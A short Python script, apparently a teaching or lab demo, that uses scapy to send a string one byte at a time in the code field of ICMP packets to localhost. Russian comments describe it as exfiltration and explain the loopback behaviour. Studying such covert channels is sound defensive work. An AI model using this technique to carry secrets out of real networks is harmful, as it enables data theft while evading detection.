# /// script
# requires-python = ">=3.10"
# dependencies = ["scapy"]
# ///

from scapy.all import *

# из за того что на лупбеке каждый байт будет множится на 4
# так происходит потому что система генерирует echo reply, 
# и каждый пакет является одновременно входящим и выходящим

def transmit(message, host):
    for i, m in enumerate(message):
        # в ICMP есть поле code, будем эксфильтрировать по 1 байту
        packet = IP(dst = host) / ICMP(code = ord(m), seq = i)
        send(packet)

host = "127.0.0.1"
message = "Kaori"
transmit(message, host)
